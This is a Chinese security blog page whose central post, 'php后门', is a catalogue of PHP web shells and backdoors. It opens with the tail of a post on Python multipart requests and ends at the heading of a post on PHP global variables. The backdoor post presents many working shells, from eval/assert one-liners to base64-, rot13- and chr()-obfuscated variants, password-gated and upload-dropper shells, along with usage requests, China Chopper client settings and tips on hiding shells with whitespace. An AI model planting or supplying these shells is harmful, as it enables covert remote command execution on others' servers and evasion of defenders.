requests.post("https://api.surfeasy.com/v3/geo_lookup", verify=False, headers=header, data=data).text</span></div><div class="line">req = urllib2.Request(url=<span class="string">"https://api.surfeasy.com/v2/geo_list"</span>, headers=header)</div><div class="line">req.add_header(<span class="string">'Content-type'</span>, <span class="string">"multipart/form-data; boundary=123456"</span>)</div><div class="line">req.add_header(<span class="string">'Content-length'</span>, len(data))</div><div class="line">req.add_data(data)</div><div class="line"></div><div class="line"><span class="keyword">print</span> urllib2.urlopen(req).read() <span class="comment">#读取指定网站的内容</span></div></pre></td></tr></table></figure>
<font color="#f00">你会发现，我们竟然用post的方法进行了相应的请求！但是这里面有几处十分坑爹的地方</font>

<ol>
<li>boundary所包含的字符串一定是data中分界的字符串，并且一般以--boundary开头，以--boundary--结尾</li>
<li>注意data数据换行用\r\n或者\x0d\x0a来分割，最后结尾处也有\r\n</li>
<li>header头中的Content-type一定得有，但是Content-length却不是必须的</li>
<li>一般Content-Disposition: form-data;数据会先空一行，然后才是数据</li>
</ol>
<p>本内容参考的是:<a href="https://gist.github.com/zhenyi2697/5252801" target="_blank" rel="external">https://gist.github.com/zhenyi2697/5252801</a></p>
<h5 id="方法二：用requests请求"><a href="#方法二：用requests请求" class="headerlink" title="方法二：用requests请求"></a>方法二：用requests请求</h5><p>可能大家会说，requests多简单啊，其实确实是这样的，毕竟requests是专门为黑客开发的一套工具</p>
<blockquote>
<p> 当然，我们仍然可以利用上述的方法进行请求，我尝试过，仍然可以得到需要的结果！</p>
</blockquote>
<p>现在讲讲另外一种方法</p>
<p>在官方网站上，requests模拟一个表单数据的格式如下：</p>
<blockquote>
<p>files = {&#39;name&#39;: (<filename>, <file object="">,<content type="">, <per-part headers="">)}</per-part></content></file></filename></p>
<p>如果有多条内容，就在字典中加入多个内容。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">files = &#123;</div><div class="line">  &apos;device_id&apos;:(None,None,&quot;ab197fb4782f20bd5808133bdd8121ecd422ffb6&quot;)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后发送请求</p>
<blockquote>
<p> response=requests.post(url,files=files)</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/28/php后门/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/28/php后门/" itemprop="url">php后门</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-28T20:39:59+08:00">
                2017-08-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="获取输入数据的手段"><a href="#获取输入数据的手段" class="headerlink" title="获取输入数据的手段"></a>获取输入数据的手段</h3><p>$\_GET[&quot;password&quot;]</p>
<p>$\_POST[&quot;password&quot;]</p>
<p>$\_REQUEST[&quot;password&quot;]</p>
<p>$\_COOKIE[&quot;password&quot;]</p>
<p>$\_GET[&quot;password&quot;]</p>
<p>$\_SERVER[&#39;HTTP_USER_AGENT&#39;]</p>
<p>$\_SERVER[&#39;HTTP_HOST&#39;]</p>
<p>$_SERVER[&#39;HTTP_REFERER&#39;]</p>
<p>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]    // Accept-Language: </p>
<p>$_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;]    // Accept-Charset:</p>
<p>$_SERVER[&#39;QUERY_STRING&#39;]    /?abcdef</p>
<p>$_SERVER[&#39;HTTP_X\_FORWARDED\_FOR&#39;]</p>
<p>$_SERVER[&#39;HTTP_CONNECTION&#39;]    // Connection: </p>
<p>$_SERVER[&#39;HTTP_ACCEPT_ENCODING&#39;]  // Accept-Encoding: </p>
<p>$_SERVER[&#39;HTTP_ACCEPT&#39;]        // Accept: </p>
<p>$_SERVER[&#39;HTTP_VIA&#39;]        // Via: </p>
<p>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]    // Client-IP:</p>
<p>$_SERVER[&#39;HTTP_UPGRADE_INSECURE_REQUESTS&#39;]    // Upgrade-Insecure-Requests:</p>
<p>$_SERVER[&quot;HTTP_CACHE_CONTROL&quot;]    // Cache-Control:</p>
<p>$_SERVER[&quot;HTTP_KEEP_ALIVE&quot;]            // Keep-Alive: </p>
<p>$\_SERVER[&quot;HTTP_AB_CD&quot;]        // Ab-Cd: </p>
<blockquote>
<p>其实从后面的$\<em>SERVER[&quot;HTTP\</em>&quot;]的一些展示可以看出，对于头文件中的任意字段，只需要将-转换为\<em>，并且将所有字母转化为大写，那么就可以在php后端中进行处理！所以以HTTP</em>开头的内容，其实是自定义内容！</p>
</blockquote>
<h3 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h3><p>php提供4种方法执行系统外部命令：exec()、passthru()、system()、 shell_exec()。<br>在开始介绍前，先检查下php配置文件php.ini中是有禁止这是个函数。找到 disable_functions，配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">disable_functions =</div></pre></td></tr></table></figure>
<p>如果“disable_functions=”后面有接上面四个函数，将其删除。<br>默认php.ini配置文件中是不禁止你调用执行外部命令的函数的。</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>string <strong>exec</strong> ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">echo</span> exec(<span class="string">"ls"</span>,$file);</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">        print_r($file);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">test.php</div><div class="line">Array( [0] =&gt; index.php [1] =&gt; test.php)</div></pre></td></tr></table></figure>
<p>知识点：<br>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。</p>
<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>void <strong>passthru</strong> ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        passthru(<span class="string">"ls"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.phptest.php</div></pre></td></tr></table></figure>
<p>知识点：<br>passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p>
<h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>string <strong>system</strong> ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">        system(&quot;ls /&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">binbootcgroupdevetchomeliblost+foundmediamntoptprocrootsbinselinuxsrvsystmpusrvar</div></pre></td></tr></table></figure>
<p>知识点：<br>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</p>
<h4 id="反撇号-和shell-exec"><a href="#反撇号-和shell-exec" class="headerlink" title="反撇号`和shell_exec()"></a>反撇号`和shell_exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">echo</span> `pwd`;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/var/www/html</div></pre></td></tr></table></figure>
<p>知识点：</p>
<p>shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体</p>
<h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>resource <strong>popen</strong> ( string <code>$command</code> , string <code>$mode</code> )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$handle = popen(<span class="string">"dir"</span>, <span class="string">"r"</span>);</div><div class="line">$read = fread($handle, <span class="number">4096</span>);</div><div class="line"><span class="keyword">echo</span> $read;</div><div class="line">pclose($handle);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> E:\wamp\www\</div><div class="line"></div><div class="line">2017/08/28  19:27    &lt;DIR&gt;          .</div><div class="line">2017/08/28  19:27    &lt;DIR&gt;          ..</div><div class="line">2017/08/20  11:43               656 404.php</div><div class="line">2017/05/07  13:51               145 302.php</div></pre></td></tr></table></figure>
<p>知识点：</p>
<p>popen也可以执行命令，知识执行命令时不是很方便</p>
<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>void <strong>pcntl_exec</strong> ( string <code>$path</code> [, array <code>$args</code> [, array <code>$envs</code> ]] )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#exec.php</div><div class="line">&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?&gt;</div><div class="line"></div><div class="line">#/tmp/b4dboy.sh</div><div class="line">#!/bin/bash</div><div class="line">ls -l /</div></pre></td></tr></table></figure>
<h3 id="php后门"><a href="#php后门" class="headerlink" title="php后门"></a>php后门</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></div><div class="line">post: <span class="number">1</span>=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(str_rot13(<span class="string">'riny($_CBFG[cntr]);'</span>));<span class="meta">?&gt;</span></div><div class="line">post: page=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> call_user_func(create_function(<span class="keyword">null</span>,<span class="string">'assert($_POST[c]);'</span>));<span class="meta">?&gt;</span></div><div class="line">post: c=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $x=base64_decode(<span class="string">"YXNzZXJ0"</span>);$x($_POST[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></div><div class="line">中间base64解密为assert</div><div class="line">post: c=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> array_map(<span class="string">"ass\x65rt"</span>,(<span class="keyword">array</span>)$_REQUEST[<span class="string">'expdoor'</span>]);<span class="meta">?&gt;</span></div><div class="line">get/post: expdoor=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @preg_replace(<span class="string">"/f/e"</span>,$_GET[<span class="string">'u'</span>],<span class="string">"fengjiao"</span>); <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</div><div class="line">◆i ：如果在修饰符中加上<span class="string">"i"</span>，则正则将会取消大小写敏感性，即<span class="string">"a"</span>和<span class="string">"A"</span> 是一样的。</div><div class="line">◆m：默认的正则开始<span class="string">"^"</span>和结束<span class="string">"$"</span>只是对于正则字符串如果在修饰符中加上<span class="string">"m"</span>，那么开始和结束将会指字符串的每一行：每一行的开头就是<span class="string">"^"</span>，结尾就是<span class="string">"$"</span>。</div><div class="line">◆s：如果在修饰符中加入<span class="string">"s"</span>，那么默认的<span class="string">"."</span>代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！</div><div class="line">◆x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。</div><div class="line">◆e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。</div><div class="line">◆A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说<span class="string">"/a/A"</span>匹配<span class="string">"abcd"</span>。</div><div class="line">◆E：与<span class="string">"m"</span>相反，如果使用这个修饰符，那么<span class="string">"$"</span>将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。</div><div class="line">◆U：和问号的作用差不多，用于设置<span class="string">"贪婪模式"</span>。</div><div class="line"></div><div class="line">http:<span class="comment">//localhost/test2.php?u=eval($_POST[c]);</span></div><div class="line">post: c=system(<span class="string">"ls"</span>);</div><div class="line"></div><div class="line">菜刀中：</div><div class="line">密码：c</div><div class="line">配置：&lt;O&gt;u=<span class="keyword">eval</span>($_POST[c]);&lt;/O&gt;</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">其实其将</div><div class="line"><span class="comment">//<span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">eval</span>($_POST[door])</div><div class="line"><span class="comment">//<span class="meta">?&gt;</span></span></div><div class="line">多次base64加密解密，并且在一定程度上进行了混淆(插入了chr(<span class="number">47</span>))</div><div class="line"></div><div class="line">post: door=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>($_FILES[<span class="string">'u'</span>][<span class="string">'tmp_name'</span>]);  <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">上传一个木马文件，最好的方式是上传一个大马，这样对方就很难进行测试</div><div class="line"></div><div class="line">请求：</div><div class="line">/index.php?c=system(<span class="string">'ls'</span>);</div><div class="line">Content-Type: multipart/form-data; boundary=--------------------------<span class="number">-262952846810849</span></div><div class="line">  </div><div class="line">----------------------------<span class="number">-262952846810849</span></div><div class="line">Content-Disposition: form-data; name=<span class="string">"u"</span>; filename=<span class="string">"easy.php"</span></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[c]); <span class="meta">?&gt;</span></div><div class="line">----------------------------<span class="number">-262952846810849</span>--</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">"hackers"</span>]==<span class="string">"2b"</span>)&#123;<span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>) &#123; <span class="keyword">echo</span> <span class="string">"url:"</span>.$_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>];<span class="keyword">if</span>(!file_exists($_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>]))&#123; copy($_FILES[<span class="string">"upfile"</span>][<span class="string">"tmp_name"</span>], $_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>]); &#125;&#125;<span class="meta">?&gt;</span>&lt;form method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;&lt;input name=<span class="string">"upfile"</span> type=<span class="string">"file"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"ok"</span>&gt;&lt;/form&gt;<span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">用法：</div><div class="line">上传木马文件，最好还是上传大马！</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $s=@$_GET[<span class="number">2</span>];<span class="keyword">if</span>(md5($s.$s)==<span class="string">"c70d1cfca94435256f2874706af4c3c8"</span>)@<span class="keyword">eval</span>($_REQUEST[$s]); <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">用法：</div><div class="line">get: ?<span class="number">2</span>=moushen</div><div class="line">post/get: moushen=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $_uU=chr(<span class="number">99</span>).chr(<span class="number">104</span>).chr(<span class="number">114</span>);$_cC=$_uU(<span class="number">101</span>).$_uU(<span class="number">118</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">108</span>).$_uU(<span class="number">40</span>).$_uU(<span class="number">36</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">80</span>).$_uU(<span class="number">79</span>).$_uU(<span class="number">83</span>).$_uU(<span class="number">84</span>).$_uU(<span class="number">91</span>).$_uU(<span class="number">49</span>).$_uU(<span class="number">93</span>).$_uU(<span class="number">41</span>).$_uU(<span class="number">59</span>);$_fF=$_uU(<span class="number">99</span>).$_uU(<span class="number">114</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">102</span>).$_uU(<span class="number">117</span>).$_uU(<span class="number">110</span>).$_uU(<span class="number">99</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">105</span>).$_uU(<span class="number">111</span>).$_uU(<span class="number">110</span>);$_=$_fF(<span class="string">""</span>,$_cC);@$_();<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">等价于：</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_uU=<span class="string">"chr"</span>;</div><div class="line">$_cC=<span class="string">"eval($_POST[1]);"</span>;</div><div class="line">$_fF=<span class="string">"create_function"</span>;</div><div class="line">$_=create_function(<span class="string">""</span>,<span class="string">"eval($_POST[1]);"</span>);</div><div class="line">$_();	<span class="comment">// 将上面的语句进行执行</span></div><div class="line"></div><div class="line">string create_function ( string $args , string $code )</div><div class="line">$args是参数(<span class="string">"$a,$b,$c"</span>)，$code是执行代码，返回的是函数名</div><div class="line">要调用时，直接在函数名后面加上()即可。但是需要注意的是，一定不能直接加在create_function之后，需要将其返回给一个变量，然后调用！</div><div class="line"></div><div class="line">使用：</div><div class="line">post: <span class="number">1</span>=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">md5($_GET[<span class="string">'qid'</span>])==<span class="string">'ba710ce1a217e63bf9f5ac483d2e9a6f'</span>?array_map(<span class="string">"as\x73ert"</span>,(<span class="keyword">array</span>)$_REQUEST[<span class="string">'page'</span>]):next;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">array</span> array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] )</div><div class="line">array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</div><div class="line"> </div><div class="line">使用：</div><div class="line">?qid=moushenhao</div><div class="line">post/get: page</div></pre></td></tr></table></figure>
<font color="#f00">为了迷惑敌人，可以在shell中加入大量空格、换行！！</font>

<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$dI3h=$&#123;<span class="string">'_REQUEST'</span>&#125;; <span class="keyword">if</span> (!<span class="keyword">empty</span>($dI3h[<span class="string">'PBbs'</span>])) &#123;     $lwA = $dI3h[<span class="string">'UpB_'</span>];    $SdlT=$dI3h[<span class="string">'PBbs'</span>]($lwA($dI3h[<span class="string">'PWWk'</span>]),$lwA($dI3h[<span class="string">'xfrwA'</span>]));    $SdlT($lwA($dI3h[<span class="string">'Epd'</span>]));   &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">知识点：</div><div class="line">$&#123;<span class="string">'xxx'</span>&#125;,其实代表的就是$xxx，其指代的是一个变量</div><div class="line">上面的构造有很多种，但是最容易发现的就是create_function</div><div class="line"></div><div class="line">使用：</div><div class="line">?PBbs=create_function&amp;UpB_=str_rot13&amp;PWWk=$a&amp;xfrwA=riny($a);&amp;Epd=flfgrz(yf);</div><div class="line">每次只需要更改Epd字段的内容即可，对于要输入的字段，每次都是需要rot13的。</div><div class="line">  </div><div class="line">其实也可以让其看起来简单点：trim/ltrim/rtrim/strtolower/strtoupper</div><div class="line">?PBbs=create_function&amp;UpB_=trim&amp;PWWk=$n&amp;xfrwA=<span class="keyword">eval</span>($n);&amp;Epd=system(ls);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">### php一句话</span></div><div class="line"></div><div class="line">* <span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> assert($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>],$_POST[<span class="string">'sc'</span>])<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> @preg_replace(<span class="string">"/[email]/e"</span>,$_POST[<span class="string">'h'</span>],<span class="string">"error"</span>); <span class="meta">?&gt;</span></div><div class="line">　 <span class="comment">//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入</span></div><div class="line">　 &lt;O&gt;h=@<span class="keyword">eval</span>($_POST[c]);&lt;/O&gt;</div><div class="line">* &lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[sb])&lt;/script&gt;</div><div class="line">* $filename=$_GET[<span class="string">'xbid'</span>];</div><div class="line">   <span class="keyword">include</span> ($filename);</div><div class="line">* <span class="meta">&lt;?php</span> $c=<span class="string">'ass'</span>.<span class="string">'ert'</span>;$&#123;c&#125;($_POST[<span class="number">4</span>]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> $k = str_replace(<span class="string">"8"</span>,<span class="string">""</span>,<span class="string">"a8s88s8e8r88t"</span>);$k($_POST[<span class="string">"8"</span>]); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>当然，后门还有很多很多种，php小马、大马都值得我们学习，但是只需要学学就可以了，不必专注于此！！！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/27/php全局变量/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/27/php全局变量/" itemprop="url">php全局变量</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-27T23:35:21+08:00">
                2017-08-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
